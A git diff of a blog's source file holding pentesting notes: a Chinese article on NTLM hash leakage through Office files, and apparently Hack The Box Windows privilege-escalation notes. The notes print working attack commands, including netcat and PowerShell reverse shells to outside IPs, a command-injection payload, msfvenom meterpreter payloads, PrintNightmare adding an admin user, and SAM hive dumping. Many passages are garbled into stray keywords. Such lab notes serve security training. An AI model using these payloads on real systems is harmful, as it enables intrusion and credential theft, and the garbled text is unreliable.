 <p><strong>想象一下，你收到一个名为invoice.rtf</strong>的 Word 文档。乍一看，该文档以受<strong>保护视图</strong>打开，并启用了“只读”模式，以防止潜在的恶意内容。</p>
 <img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png" alt="Pasted image 20260411063448" />
 <p>然而，大多数用户可能会启用编辑功能，尤其是在文档看起来合法且无法通过其他方式修改的情况下。点击“Enable Editing”后，会弹出一个警告窗口，提示文档可能包含<strong>恶意链接</strong>，您可以选择拒绝这些更新。</p>
@@ -1893,7 +1893,7 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <p>您是否认为拒绝此提示中的链接会阻止所有外部连接？如果是这样，那就错了。由于<strong>Microsoft Word 处理自动 OLE（对象链接和嵌入）链接的方式存在逻辑缺陷</strong>，它会绕过“ _QueryHotLinks_ ”函数，忽略用户的响应。这会导致即使用户拒绝，也会通过调用链接上的std::filesystem::exists函数<strong>来自动访问远程文件。</strong></p>
 <p>如前所述，此次访问尝试会导致系统回退到通过 SMB 进行的 NTLM 身份验证。反过来，您的 NT 哈希值（NTLM 哈希值）将被发送到远程服务器，从而导致<strong>NTLM 凭据泄露</strong>。</p>
 <p><strong>该攻击通过在RTF文件中嵌入LINK属性</strong>自动发起，利用特定的“a”和“p”属性来控制OLE链接对象。除了启用编辑功能外，无需用户进行任何其他交互，这使得该漏洞尤其危险。</p>
-<h2>2. Microsoft Outlook – 通过远程映像标签泄露 NTLM 身份验证</h2>
+<h2>2. Microsoft Outlook：通过远程图片标签泄露 NTLM 身份验证</h2>
 <p><strong>想象一下，你收到一封来自不可信发件人的</strong>电子邮件，邮件正文的 HTML 代码中包含一张图片。攻击者使用了一种简单的技巧，通过类似这样的 HTML 标签插入图片：</p>
 <img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png" alt="Pasted image 20260411063704" />
 <img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063712.png" alt="Pasted image 20260411063712" />
@@ -1904,7 +1904,7 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <p><strong>为什么会发生这种情况</strong></p>
 <p>此漏洞的出现是因为 Outlook 会根据<strong>发件人的信任级别</strong>应用不同的安全规则。当电子邮件来自受信任的来源时，Outlook 不会阻止图像的自动渲染。带有指向远程 SMB 服务器的 src 属性的 HTML &lt;img&gt; 标签会在邮件打开时立即触发 NTLM 身份验证请求。这会导致用户的 NTLM 凭据立即泄露，而无需用户进行任何显式操作。</p>
 <p>在某些情况下，该问题甚至被发现可通过恶意图像复合匿名渲染实现<strong>远程代码执行 (</strong> <a href="https://www.youtube.com/watch?v=EQh6apPSRP0" target="_blank" rel="noreferrer"><strong>RCE</strong></a> <strong>)</strong>，尽管该特定漏洞已被修复。然而，自动 NTLM 泄露这一根本问题依然存在，尤其是在处理被入侵的受信任帐户时。</p>
-<h2>3. Microsoft Access – 通过远程表刷新导致的 NTLM 身份验证泄漏</h2>
+<h2>3. Microsoft Access：通过远程表刷新泄露 NTLM 身份验证</h2>
 <p><strong>想象一下，你收到一份名为report.accdb</strong>的 Microsoft Access 数据库文件形式的报告。你自然会打开该文件查看其内容。然而，首先映入眼帘的是一条警告信息：<strong>“此文件中的活动内容已被阻止”</strong> 许多用户可能会忽略这条信息，认为这是一种保护措施，并会因为潜在的危险内容已被禁用而感到安心。</p>
 <img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png" alt="Pasted image 20260411064108" />
 <p>忽略警告后，您将可以访问报告，报告中会显示一个醒目的黄色横幅，提示<strong>活动内容已被禁用</strong>。此横幅旨在让您产生一种安全感，暗示只要您不点击<strong>启用内容</strong> ，就可以安全地与文件交互。 然而，这是一种虚假的安全感——在您看到此横幅之前，您的 NTLM 哈希值就已经泄露了。</p>
@@ -1912,7 +1912,7 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <p><strong>为什么会发生这种情况</strong></p>
 <p>此问题源于对 Microsoft Access 内置功能的利用。攻击者使用<strong>查询对象</strong>结合<strong>AutoExec 宏</strong>进行攻击。AutoExec 宏配置为在打开 Access 文件时<strong>自动对远程表执行查询</strong>。这意味着，无论是否启用了活动内容，应用程序都会在文件打开后立即尝试连接到远程表。</p>
 <p>如果远程表托管在恶意 SMB 服务器上，Microsoft Access 将自动尝试使用 NTLM 进行身份验证，从而导致<strong>NTLM 凭据泄露</strong>。这种情况发生在用户决定是否启用活动内容之前，因此初始警告消息无效。</p>
-<h2>4. Microsoft Media Player – 通过旧版播放器文件泄露 NTLM 身份验证信息</h2>
+<h2>4. Microsoft Media Player：通过旧版播放列表文件泄露 NTLM 身份验证信息</h2>
 <p>想象一下，你收到一封电子邮件，附件中有一个名为<strong>voicemail.wax的</strong>音频快捷方式文件。出于好奇，你想听听里面的内容，于是双击了该文件。仅仅这一次双击，就可能在不知不觉中泄露你的 NTLM 凭据。</p>
 <img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png" alt="Pasted image 20260411064236" />
 <p>通过电子邮件附件接收语音邮件或视频消息很常见，而且这种做法可能已经在实际环境中被用于窃取 NTLM 信息。</p>
@@ -1922,7 +1922,7 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <p><strong>“设计缺陷”漏洞</strong></p>
 <p>不出所料，微软将此问题归类为一项功能。其逻辑在于，用户理应谨慎处理媒体文件。然而，更令人惊讶的是<strong>Outlook 安全筛选器</strong>对这些文件的处理方式存在不一致。Outlook 会将<strong>.asx</strong>播放列表文件作为潜在危险附件进行屏蔽，但却不会<strong>屏蔽 .wax、.wvx 或 .wmx</strong>文件——尽管所有这些文件都可能触发相同的行为并泄露 NTLM 凭据。</p>
 <img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png" alt="Pasted image 20260411064309" />
-<h2>5. Microsoft Publisher – 通过远程收件人列表泄露 NTLM 身份验证</h2>
+<h2>5. Microsoft Publisher：通过远程收件人列表泄露 NTLM 身份验证</h2>
 <p>想象一下，你收到一份设计精美的公司节日派对邀请函，它巧妙地伪装成一个名为<strong>Christmas_Party.pub的Publisher 文件</strong>。你好奇地双击该文件查看邀请函。然而，随即出现一个警告提示：<strong>“是否要打开此出版物并访问外部数据？”</strong></p>
 <p>你和你的同事都接受过处理可疑文件的培训，所以你自信地点击了 <strong>“否”</strong> 以为已经避免了任何风险。<strong>不幸的是，你错了——在警告出现之前，你的NTLM凭据就已经泄露了。</strong></p>
 <p><strong>!微软发布者警告：外部数据 NTLM 泄露</strong></p>
@@ -2156,7 +2156,7 @@ PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows
 <ul><li>The highly privileged <code>NT AUTHORITY\SYSTEM</code> account, or LocalSystem account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.</li><li>The built-in local <code>administrator</code> account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.</li><li>Another local account that is a member of the local <code>Administrators</code> group. Any account in this group will have the same privileges as the built-in <code>administrator</code> account.</li><li>A standard (non-privileged) domain user who is part of the local <code>Administrators</code> group.</li><li>A domain admin (highly privileged in the Active Directory environment) that is part of the local <code>Administrators</code> group.</li></ul>
 <ul><li><code>OS name</code> <code> </code> Windows Windows 7 10 Server 2008 2012 2016 2019 <code>PowerShell</code></li><li><code>Version</code>: <a href="https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions" target="_blank" rel="noreferrer"></a> Windows Windows</li><li><code>Running Services</code> <code> </code> <code>NT AUTHORITY\SYSTEM</code></li></ul>
 <h4>System Information</h4>
-<p><strong>Tasklist</strong></p>
+<pre><code class="language-cmd">Tasklist</code></pre>
 <pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc
 
 Image Name                     PID Services
@@ -2300,14 +2300,14 @@ Network Card(s):           2 NIC(s) Installed.
                                  [01]: 192.168.20.56
                                  [02]: fe80::f055:fefd:b1b:9919
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
-<p><code>systeminfo</code> WMI-Command QFE</p>
+<pre><code class="language-cmd">systeminfo WMI-Command QFE</code></pre>
 <pre><code class="language-cmd-session">C:\htb&gt; wmic qfe
 
 Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
 http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
 https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
 http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021</code></pre>
-<p>PowerShell cmdlet</p>
+<pre><code class="language-powershell">PowerShell cmdlet</code></pre>
 <pre><code class="language-powershell-session">PS C:\htb&gt; Get-HotFix | ft -AutoSize
 
 Source       Description     HotFixID  InstalledBy                InstalledOn
@@ -2328,7 +2328,7 @@ Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
 Java Auto Updater
 
 &lt;SNIP&gt;</code></pre>
-<p>PowerShell cmdlet</p>
+<pre><code class="language-powershell">PowerShell cmdlet</code></pre>
 <pre><code class="language-powershell-session">PS C:\htb&gt; Get-WmiObject -Class Win32_Product |  select Name, Version
 
 Name                                                                    Version
@@ -2565,8 +2565,8 @@ ROUTER                                            3               -1
 vmware-authdpipe                                  1                1
 
 &lt;SNIP&gt;</code></pre>
-<p>PowerShell <code>gci</code> <code>Get-ChildItem</code></p>
-<p><strong> PowerShell </strong></p>
+<pre><code class="language-powershell">PowerShell gci Get-ChildItem</code></pre>
+<pre><code class="language-powershell">PowerShell</code></pre>
 <pre><code class="language-powershell-session">PS C:\htb&gt;  gci \\.\pipe\
 
 
@@ -2722,7 +2722,7 @@ SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
 SeCreateGlobalPrivilege       Create global objects                     Enabled    
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
-<p><code>whoami /priv</code> SeImpersonatePrivilege <code>NT AUTHORITY\SYSTEM</code> JuicyPotato DCOM/NTLM <code>SeImpassate</code> <code>SeAssignPrimaryToken</code></p>
+<pre><code class="language-cmd">whoami /priv SeImpersonatePrivilege NT AUTHORITY\SYSTEM JuicyPotato DCOM/NTLM SeImpassate SeAssignPrimaryToken</code></pre>
 <p><code>-p</code> cmd.exe <code>-a</code> cmd.exe <code>-t</code> <code>createprocess</code> CreateProcessWithTokenW CreateProcessAsUser <code>SeImpersonate</code> <code>SeAssignPrimaryToken</code></p>
 <ol><li>Escalating Privileges Using JuicyPotato</li></ol>
 <pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *
@@ -2737,7 +2737,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
 [+] CreateProcessWithTokenW OK                                                     
 [+] calling 0x000000000088ce08</code></pre>
-<p><code>NT AUTHORITY\SYSTEM</code></p>
+<pre><code>NT AUTHORITY\SYSTEM</code></pre>
 <ol><li>Catching SYSTEM Shell</li></ol>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ sudo nc -lnvp 8443
 
@@ -2887,7 +2887,7 @@ wininit.exe                    548 Services                   0      5,240 K
 csrss.exe                      556 Console                    1      5,972 K
 winlogon.exe                   612 Console                    1     10,408 K</code></pre>
 <p>PID 612 <code>winlogon.exe</code> Windows SYSTEM</p>
-<p>Get-Process cmdlet LSASS PID</p>
+<pre><code class="language-powershell">Get-Process cmdlet LSASS PID</code></pre>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png" alt="Pasted image 20260228040031" />
 <h3>SeTakeOwnershipPrivilege</h3>
 <p><strong>WRITE_OWNER </strong></p>
@@ -2985,7 +2985,7 @@ root:n1X_p0wer_us3er!</code></pre>
 <p><strong>Windows Built-in</strong></p>
 <div class="post-table-wrap"><table><thead><tr><th>Backup Operators</th><th>Event Log Readers</th><th>DnsAdmins DNS</th></tr></thead><tbody><tr><td>Hyper-V Administrators Hyper-V</td><td>Print Operators</td><td>Server Operators</td></tr></tbody></table></div>
 <h3>Backup Operators</h3>
-<p><code>whoami /groups</code> <code>SeBackup</code> <code>SeRestore</code> SeBackupPrivilege ACL ACE FILE_FLAG_BACKUP_SEMANTICS</p>
+<pre><code class="language-cmd">whoami /groups SeBackup SeRestore SeBackupPrivilege ACL ACE FILE_FLAG_BACKUP_SEMANTICS</code></pre>
 <p>PoC <code>SeBackupPrivilege</code> PowerShell</p>
 <ol><li>Importing Libraries</li></ol>
 <pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\SeBackupPrivilegeUtils.dll
@@ -3007,7 +3007,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pr
 <pre><code class="language-powershell-session">PS C:\htb&gt; Get-SeBackupPrivilege
 
 SeBackupPrivilege is disabled</code></pre>
-<p><code>Set-SeBackupPrivilege</code></p>
+<pre><code class="language-powershell">Set-SeBackupPrivilege</code></pre>
 <ol><li>Enabling SeBackupPrivilege</li></ol>
 <pre><code class="language-powershell-session">PS C:\htb&gt; Set-SeBackupPrivilege
 PS C:\htb&gt; Get-SeBackupPrivilege
@@ -3093,7 +3093,7 @@ d-----        9/15/2018   2:06 AM                Program Files (x86)
 d-----         5/6/2021   1:05 PM                Tools
 d-r---         5/6/2021  12:51 PM                Users
 d-----        3/24/2021   6:38 PM                Windows</code></pre>
-<p><code>Copy-FileSeBackupPrivilege</code> cmdlet ACL NTDS.dit</p>
+<pre><code class="language-cmd">Copy-FileSeBackupPrivilege cmdlet ACL NTDS.dit</code></pre>
 <ol><li>Copying NTDS.dit Locally</li></ol>
 <pre><code class="language-powershell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
@@ -3252,13 +3252,13 @@ The command completed successfully.</code></pre>
 <p><strong>Passing Credentials to wevtutil</strong></p>
 <pre><code class="language-cmd-session">C:\htb&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
 <blockquote><code>Get-WInEvent</code> <code> </code> <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> <code> </code></blockquote>
-<p><strong> Get-WinEvent </strong></p>
+<pre><code class="language-powershell">Get-WinEvent</code></pre>
 <pre><code class="language-powershell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 
 CommandLine
 -----------
 net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
-<p>PowerShell</p>
+<pre><code class="language-powershell">PowerShell</code></pre>
 <h3>DnsAdmins</h3>
 <p>DnsAdmins DNS Windows DNS DNS DNS <code>NT AUTHORITY\SYSTEM</code> DNS dnscmd DLL <a href="https://adsecurity.org/?p=4064" target="_blank" rel="noreferrer"></a> DNS</p>
 <p>DNS RPC</p>
@@ -3276,7 +3276,7 @@ No encoder specified, outputting raw payload
 Payload size: 313 bytes
 Final size of dll file: 5120 bytes
 Saved as: adduser.dll</code></pre>
-<p>Python HTTP</p>
+<pre><code class="language-shell">Python HTTP</code></pre>
 <ol><li>HTTP</li></ol>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ python3 -m http.server 7777
 
@@ -3290,13 +3290,14 @@ Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 <p>Press enter or click to view image in full size</p>
 <img src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png" alt="Referenced image" />
 <ol><li>cmd DNS</li></ol>
-<p>sc stop dns sc start dns</p>
+<pre><code class="language-cmd">sc stop dns
+sc start dns</code></pre>
 <img src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png" alt="Referenced image" />
 <p>We then get a reverse shell simultaniously:</p>
 <p>Press enter or click to view image in full size</p>
 <img src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png" alt="Referenced image" />
 <p>now you can get the flag on:</p>
-<p>c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</p>
+<pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
 <h3>Print Operators</h3>
 <p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators" target="_blank" rel="noreferrer"></a> <code>SeLoadDriverPrivilege</code> <code>whoami /priv</code> <code>SeLoadDriverPrivilege</code> (UAC)</p>
 <pre><code class="language-cmd-session">C:\htb&gt; whoami /priv
@@ -3550,17 +3551,17 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <pre><code>sc start WindscribeService</code></pre>
 <p>****</p>
 <ol><li>Unquoted Service Path</li></ol>
-<p>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</p>
-<p>sc qc SystemExplorerHelpService</p>
-<p>C:\Program.exe</p>
+<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
+<pre><code class="language-cmd">sc qc SystemExplorerHelpService</code></pre>
+<pre><code class="language-cmd">C:\Program.exe</code></pre>
 <hr />
 <ol><li>Permissive Registry ACLs</li></ol>
 <p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
-<p>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</p>
-<p>sc start ModelManagerService</p>
+<pre><code class="language-powershell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
+<pre><code class="language-cmd">sc start ModelManagerService</code></pre>
 <hr />
 <ol><li>Modifiable Registry Autorun Binary</li></ol>
-<p>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</p>
+<pre><code class="language-powershell">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre>
 <pre><code>icacls &lt;startup program path&gt;</code></pre>
 <h2>Kernel Exploits</h2>
 <p><strong>HTB Windows </strong> <strong>3 </strong> <strong><code>NT AUTHORITY\SYSTEM</code></strong> <strong>Administrator Desktop</strong> flag</p>
@@ -3572,100 +3573,106 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <ul><li>SYSTEM</li><li>SYSTEM shell</li></ul>
 <h3>PrintNightmare</h3>
 <h4>Spooler</h4>
-<p>PowerShell</p>
-<p>ls \\localhost\pipe\spoolss</p>
+<pre><code class="language-powershell">PowerShell</code></pre>
+<pre><code>ls \\localhost\pipe\spoolss</code></pre>
 <hr />
-<p>Set-ExecutionPolicy Bypass -Scope Process</p>
+<pre><code class="language-powershell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
 <hr />
-<p>Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</p>
+<pre><code class="language-powershell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
 <ul><li>created payload</li></ul>
 <ul><li>added user hacker as local administrator</li></ul>
 <hr />
-<p>net user hacker</p>
-<p>net localgroup administrators</p>
+<pre><code class="language-cmd">net user hacker</code></pre>
+<pre><code class="language-cmd">net localgroup administrators</code></pre>
 <hr />
 <h4>shell</h4>
 <ul><li><code>hacker</code></li></ul>
 <ul><li><code>Pwnd1234!</code></li></ul>
-<p>runas /user:hacker cmd</p>
+<pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
 <hr />
 <h4>shell</h4>
-<p>Start-Process cmd -Verb RunAs</p>
+<pre><code class="language-powershell">Start-Process cmd -Verb RunAs</code></pre>
 <hr />
 <h4>flag</h4>
-<p>type C:\Users\Administrator\Desktop\flag.txt</p>
-<p>dir C:\Users\Administrator\Desktop</p>
+<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
+<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
 <hr />
 <h3>HiveNightmare / SeriousSam</h3>
 <hr />
 <h4>SAM</h4>
-<p>icacls C:\Windows\System32\config\SAM</p>
-<p>BUILTIN\Users:(I)(RX)</p>
+<pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
+<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
 <hr />
 <h4>HiveNightmare</h4>
-<p>.\HiveNightmare.exe</p>
+<pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
 <ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
 <ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
 <ul><li><code>SECURITY-xxxx-xx-xx</code></li></ul>
 <hr />
 <p>Kali impacket</p>
-<p>impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</p>
+<pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
 <hr />
 <ul><li>PTH</li></ul>
 <ul><li>SMB / WinRM / PsExec</li></ul>
 <hr />
 <h3>CVE-2020-0668 + Mozilla Maintenance Service</h3>
-<p>whoami /priv</p>
+<pre><code class="language-cmd">whoami /priv</code></pre>
 <hr />
 <h4>Mozilla Maintenance Service</h4>
-<p>icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
-<p>BUILTIN\Users:(I)(RX)</p>
+<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
+<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
 <hr />
 <h4>exe</h4>
-<p>msfvenom</p>
-<p>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt; VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</p>
+<pre><code class="language-shell">msfvenom</code></pre>
+<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
 <hr />
 <h4>HTTP</h4>
-<p>python3 -m http.server 8080</p>
+<pre><code class="language-shell">python3 -m http.server 8080</code></pre>
 <hr />
 <h4>exe</h4>
-<p>PowerShell</p>
-<p>wget http://&lt; VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe wget http://&lt; VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</p>
+<pre><code class="language-powershell">PowerShell</code></pre>
+<pre><code class="language-powershell">wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
+wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
 <hr />
 <h4>CVE-2020-0668</h4>
-<p>exploit <code>C:\Tools\CVE-2020-0668\</code></p>
-<p>C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
+<pre><code>exploit C:\Tools\CVE-2020-0668\</code></pre>
+<pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <ul><li><code>Moving ...</code></li></ul>
 <ul><li><code>Creating symbol links</code></li></ul>
 <ul><li><code>Updating ... Tracing ...</code></li></ul>
 <ul><li><code>Done!</code></li></ul>
 <hr />
-<p>icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
-<p>(F)</p>
+<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
+<pre><code>(F)</code></pre>
 <p>Full Control</p>
 <hr />
 <h4>exe</h4>
 <p><strong>cmd.exe</strong> PowerShell</p>
-<p>copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
+<pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <hr />
 <h4>handler</h4>
 <p><code>handler.rc</code></p>
-<p>use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_https set LHOST &lt; VPN_IP&gt; set LPORT 8443 exploit</p>
-<p>sudo msfconsole -r handler.rc</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST &lt;VPN_IP&gt;
+set LPORT 8443
+exploit</code></pre>
+<pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
 <hr />
 <h4>Mozilla</h4>
-<p>net start MozillaMaintenance</p>
-<p>The service is not responding to the control function</p>
+<pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
+<pre><code>The service is not responding to the control function</code></pre>
 <hr />
 <h4>msfconsole SYSTEM session</h4>
-<p>Meterpreter session opened ...</p>
-<p>getuid</p>
-<p>NT AUTHORITY\SYSTEM</p>
+<pre><code>Meterpreter session opened ...</code></pre>
+<pre><code>getuid</code></pre>
+<pre><code>NT AUTHORITY\SYSTEM</code></pre>
 <hr />
 <h4>flag</h4>
 <p>meterpreter</p>
-<p>shell type C:\Users\Administrator\Desktop\flag.txt</p>
-<p>dir C:\Users\Administrator\Desktop</p>
+<pre><code>shell
+type C:\Users\Administrator\Desktop\flag.txt</code></pre>
+<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
 <h2>Credential Theft</h2>
 <h3>Credential</h3>
 <ol><li><strong> </strong></li></ol>
@@ -3733,7 +3740,7 @@ wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u
 $encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
 $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
 Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword</code></pre>
-<p>PowerShell</p>
+<pre><code class="language-powershell">PowerShell</code></pre>
 <pre><code>PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
 PS C:\htb&gt; $credential.GetNetworkCredential().username
 
@@ -3753,7 +3760,7 @@ stuff.txt:password: l#-x9r11_2_GL!</code></pre>
 <pre><code>C:\htb&gt; findstr /spin "password" _._
  
 stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
-<p><strong> PowerShell </strong></p>
+<pre><code class="language-powershell">PowerShell</code></pre>
 <pre><code>PS C:\htb&gt; select-string -Path C:\Users\htb-student\Documents*.txt -Pattern password
 
 stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
@@ -3802,7 +3809,7 @@ Mode                 LastWriteTime         Length Name
 -a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
 <p><code>plum.sqlite*</code> DB SQLite <code>select Text from Note;</code> Note <code>Text</code></p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png" alt="Pasted image 20260322052414" />
-<p><strong> PowerShell </strong> PowerShell PSSQLite StickNotes SQLite <code>Note</code> <code>.sqlite</code> WinRM</p>
+<pre><code class="language-powershell">PowerShell  PowerShell PSSQLite StickNotes SQLite Note .sqlite WinRM</code></pre>
 <pre><code class="language-powershell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process
 
 Execution Policy Change
@@ -4238,7 +4245,7 @@ set lhost 10.10.15.137
 
 
 127.0.0.1 &amp; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.137',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>`,
-      zh: String.raw`<h2>Introduction</h2>
+      zh: String.raw`<h2>介绍</h2>
 <p>权限提升的总体目标是将我们对特定系统的访问权限提升到组成员<code>Local Administrators</code>或<code>NT AUTHORITY\SYSTEM</code> 本地系统帐户。然而，在某些情况下，提升到系统上的其他用户就足以实现我们的目标。权限提升通常是任何攻击活动中至关重要的一步。我们需要使用获得的访问权限，或者只有在提升权限的上下文中进行会话后才能找到的某些数据（例如凭据）。在某些情况下，如果客户聘请我们进行“黄金映像”或“工作站突破”类型的评估，权限提升可能是评估的最终目标。权限提升通常对于通过网络继续实现我们的最终目标以及横向移动至关重要。</p>
 <p>话虽如此，我们可能需要提升权限，原因如下：</p>
